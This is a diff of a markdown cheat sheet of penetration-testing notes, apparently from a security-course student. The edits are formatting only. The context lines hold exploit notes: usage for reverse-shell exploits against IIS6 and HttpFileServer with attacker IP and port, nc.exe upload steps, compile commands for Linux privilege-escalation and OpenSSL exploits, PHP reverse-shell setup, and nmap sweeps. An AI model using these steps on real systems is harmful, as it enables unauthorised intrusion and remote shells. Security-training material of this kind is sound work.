@@ -6,7 +6,9 @@
 <p>
 source: https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
 
-`usage: python exploit.py <ip> <port> <attacking-ip> <attacking-port>`
+```python
+python exploit.py <ip> <port> <attacking-ip> <attacking-port>
+```
 
 </p>
 </details>
@@ -14,7 +16,9 @@ source: https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/m
 <details><summary>MS14-058 HttpFileServer 2.3.x RCE</summary>
 <p>
 source: https://www.exploit-db.com/exploits/37064
+ 
 Upload nc.exe into victim machine and performs a reverse shell using nc.exe
+
 ```python
     #change these to your webserver for uploading nc.exe
     ip_addr = "192.168.1.20" 
@@ -27,7 +31,6 @@ Upload nc.exe into victim machine and performs a reverse shell using nc.exe
 
 <details><summary>MS08-067 Python Remote Exploit</summary>
 <p>
-
 source: https://www.exploit-db.com/exploits/40279
 edit `shellcode` variable with payload and adjusts NOPS to fit it
 
@@ -53,7 +56,9 @@ fix by adding the following above code:
 ```
 
 To Compile:
-`gcc 18411.c -o exploit`
+```bash
+gcc 18411.c -o exploit
+```
 
 </p>
 </details>
@@ -61,8 +66,8 @@ To Compile:
 
 <details><summary>Linux Kernel 2.2-4 PrivEsc (ptrace-kmod)</summary>
 <p>
+source: https://www.exploit-db.com/exploits/3
 
-(https://www.exploit-db.com/exploits/3)
 Works for 2.2.x and 2.4.x kernels.
 ```c
 // include <linux/user.h> <---remove this
@@ -75,9 +80,9 @@ Works for 2.2.x and 2.4.x kernels.
 
 <details><summary>Mod SSL 2.8.7 OpenSSL Exploit (openfartV2.c)</summary>
 <p>
-
-(https://www.exploit-db.com/exploits/764)
+source: https://www.exploit-db.com/exploits/764
 commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.
+
 Usage:
 1. compile code
 `gcc -o openfuck openfuckV2.c -lcrypto`
@@ -92,8 +97,7 @@ _if you encounter missing ld error while compiling at victim machine, try checki
 ### Other Exploits
 <details><summary>PHP Reverse Shell (pentest monkey)</summary>
 <p>
-
-(http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+source: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`
 1. modify code
 ```c
@@ -109,8 +113,8 @@ $port = 1234;       // CHANGE THIS
 ### Tools
 <details><summary>Onetwopunch - wrapper for unicorn and nmap scan</summary>
 <p>
-
-(https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh) 
+source: https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
+ 
 Scan for port using nicornscan (very fast) and chain it with nmap vuln nse script scan
 1. ping sweep for online hosts into list
 `nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
@@ -134,8 +138,8 @@ Scan for port using nicornscan (very fast) and chain it with nmap vuln nse scrip
 
 <details><summary>Droopescan - drupal scanner</summary>
 <p>
-
-(https://github.com/droope/droopescan)
+source: https://github.com/droope/droopescan
+ 
 ```
 git clone https://github.com/droope/droopescan.git
 cd droopescan
@@ -150,6 +154,7 @@ droopescan scan drupal -u http://10.11.1.49
 
 Checks Samba version as enum4linux messed up?
 THanks fellow student OS-40285/rewardone
+
 ```bash
 ./samba_checker.sh <ipaddress> <port>
 ```
